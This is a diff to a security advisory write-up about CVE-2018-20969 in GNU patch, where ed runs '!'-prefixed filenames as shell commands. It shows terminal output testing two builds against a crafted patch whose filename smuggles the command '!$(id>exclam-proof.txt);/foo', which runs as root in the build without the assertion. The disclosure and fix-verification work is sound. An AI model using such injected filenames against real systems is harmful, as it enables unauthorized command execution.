@@ -126,11 +126,52 @@ root@3ffaeb445eab:/data/test1/test-apply3# cat /root/.bashrc
 + content
 ```
 
-### CVE-2018-20969 - OS shell execution via unrestricted ed filename
+### CVE-2018-20969 - OS shell command execution via ! prefixed ed filenames
 
-(Yes, this one was reported by me in 2019 and MITRE indeed assigned a 2018 ID for it)
+If `ed` receives an exclaimation mark prefixed command line argument, it is executed
+as a shell command via popen. This was exploitable via GNU `patch` as well.
+
+Official fix:
+
+https://git.savannah.gnu.org/cgit/patch.git/commit/?id=3fcd042d26d70856e826a42b5f93dc4854d80bf0
+
+The referenced patch is the same as for CVE-2019-13638; note the assertion line.
+
+(Yes, CVE-2018-20969 was reported by me in 2019 along with the other two and MITRE indeed 
+assigned a 2018 ID for it)
+
+Since `ed` is capturing the output of what it executes and the same version of GNU `patch` was vulnerable 
+I decided to build 2 versions of `patch` with the above patch applied, one with the assertion line and
+one without it.
+
+
+```
+root@a8e181dcb4b1:/data# diff /data/patch-3fcd042d26d70856e826a42b5f93dc4854d80bf0-assert/src/pch.c /data/patch-3fcd042d26d70856e826a42b5f93dc4854d80bf0-noassert/src/pch.c
+2470c2470
+<           assert (outname[0] != '!' && outname[0] != '-');
+---
+>           // assert (outname[0] != '!' && outname[0] != '-');
+
+root@a8e181dcb4b1:/data/edstyle5# ../patch-3fcd042d26d70856e826a42b5f93dc4854d80bf0-assert/src/patch -p0 < CVE-2018-20969.patch
+patching file '!$(id>exclam-proof.txt);/foo'
+patch: pch.c:2470: do_ed_script: Assertion `outname[0] != '!' && outname[0] != '-'' failed.
+../patch-3fcd042d26d70856e826a42b5f93dc4854d80bf0-assert/src/patch: **** ed FAILED
+root@a8e181dcb4b1:/data/edstyle5# cat exclam-proof.txt
+cat: exclam-proof.txt: No such file or directory
+
+
+root@a8e181dcb4b1:/data/edstyle5# ../patch-3fcd042d26d70856e826a42b5f93dc4854d80bf0-noassert/src/patch -p0 < CVE-2018-20969.patch
+patching file '!$(id>exclam-proof.txt);/foo'
+sh: 1: /foo.oislN9J: not found
+../patch-3fcd042d26d70856e826a42b5f93dc4854d80bf0-noassert/src/patch: **** ed FAILED
+root@a8e181dcb4b1:/data/edstyle5# cat exclam-proof.txt
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+
 
 ## Remediation
 
 Upgrade to latest version of patch provided by your Operating System.
 If you build it your own, bump to the head of the master branch.
+
